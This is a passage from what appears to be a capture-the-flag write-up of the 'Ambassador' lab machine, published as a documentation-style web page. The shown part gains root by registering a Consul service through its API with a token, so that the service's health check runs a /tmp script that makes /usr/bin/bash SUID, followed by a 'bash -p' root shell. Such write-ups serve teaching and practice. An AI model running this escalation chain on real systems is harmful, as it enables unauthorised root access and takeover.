+<span class="w">  </span><span class="nt">&quot;TaggedAddresses&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;lan_ipv4&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;Address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;Port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;wan_ipv4&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;Address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;Port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">&quot;Weights&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;Passing&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;Warning&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">&quot;EnableTagOverride&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;ContentHash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;8fb6dc4f012493d5&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Datacenter&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;dc1&quot;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>writing a bash script in /tmp that will make a suid bash</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;chmod +s /usr/bin/bash&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>blnkn.sh
+cat<span class="w"> </span>blnkn.sh
+chmod<span class="w"> </span>+s<span class="w"> </span>/usr/bin/bash
+chmod<span class="w"> </span>+x<span class="w"> </span>blnkn.sh
+<span class="w"> </span>which<span class="w"> </span>bash
+/usr/bin/bash
+ls<span class="w"> </span>-la<span class="w"> </span><span class="k">$(</span>which<span class="w"> </span>bash<span class="k">)</span>
+-rwxr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">1183448</span><span class="w"> </span>Apr<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">09</span>:14<span class="w"> </span>/usr/bin/bash
+</pre></div>
+</div>
+<p>and creating a service that calls that bash script as a check</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;X-Consul-Token: </span><span class="si">${</span><span class="nv">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-X<span class="w"> </span>PUT<span class="w"> </span><span class="s1">&#39;http://127.0.0.1:8500/v1/agent/service/register&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
+<span class="s1">  &quot;ID&quot;: &quot;blnkn&quot;,</span>
+<span class="s1">  &quot;Name&quot;: &quot;blnkn&quot;,</span>
+<span class="s1">  &quot;Address&quot;: &quot;127.0.0.1&quot;,</span>
+<span class="s1">  &quot;Port&quot;: 80,</span>
+<span class="s1">  &quot;check&quot;: {</span>
+<span class="s1">    &quot;Args&quot;: [</span>
+<span class="s1">      &quot;/usr/bin/bash&quot;,</span>
+<span class="s1">      &quot;/tmp/blnkn.sh&quot;</span>
+<span class="s1">    ],</span>
+<span class="s1">    &quot;interval&quot;: &quot;10s&quot;,</span>
+<span class="s1">    &quot;timeout&quot;: &quot;1s&quot;</span>
+<span class="s1">  }</span>
+<span class="s1">}&#39;</span>
+</pre></div>
+</div>
+<p>checking that my service has been created</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;X-Consul-Token: </span><span class="si">${</span><span class="nv">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-X<span class="w"> </span>GET<span class="w"> </span><span class="s1">&#39;http://127.0.0.1:8500/v1/agent/service/blnkn&#39;</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
+<span class="w">  </span>jq<span class="w"> </span><span class="s2">&quot;.&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;ID&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;blnkn&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Service&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;blnkn&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">  </span><span class="nt">&quot;Meta&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
+<span class="w">  </span><span class="nt">&quot;Port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;TaggedAddresses&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;lan_ipv4&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;Address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;Port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;wan_ipv4&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;Address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;Port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">&quot;Weights&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;Passing&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;Warning&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">&quot;EnableTagOverride&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;ContentHash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;fd910d44cc6214e9&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Datacenter&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;dc1&quot;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>yep</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>consul<span class="w"> </span>catalog<span class="w"> </span>services
+blnkn
+consul
+meow
+svc111
+</pre></div>
+</div>
+<p>and now bash is suid, so we can run it with preserve and it won’t drop root permissions.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ls<span class="w"> </span>-la<span class="w"> </span><span class="k">$(</span>which<span class="w"> </span>bash<span class="k">)</span>
+-rwsr-sr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">1183448</span><span class="w"> </span>Apr<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">09</span>:14<span class="w"> </span>/usr/bin/bash
+bash<span class="w"> </span>-p
+id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>developer<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>developer<span class="o">)</span><span class="w"> </span><span class="nv">euid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">egid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>developer<span class="o">)</span>
+<span class="nb">cd</span><span class="w"> </span>/root/
+wc<span class="w"> </span>-c<span class="w"> </span>root.txt
+<span class="m">33</span><span class="w"> </span>root.txt
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../authority/authority.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Authority</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../medium.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Medium</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Ambassador</a><ul>
+<li><a class="reference internal" href="#enum">Enum</a></li>
+<li><a class="reference internal" href="#grafana-8-0-0-8-3-0-directory-traversal">Grafana 8.0.0 -&gt; 8.3.0 - Directory traversal</a></li>
+<li><a class="reference internal" href="#connecting-to-the-mysql-database">Connecting to the MySQL database</a></li>
+<li><a class="reference internal" href="#forraging-git-history-for-tokens">Forraging git history for tokens</a></li>
+<li><a class="reference internal" href="#exploring-the-inner-workings-of-consul">Exploring the inner workings of Consul</a></li>
+<li><a class="reference internal" href="#command-execution-with-the-consul-service-api">Command Execution with the Consul Service API</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
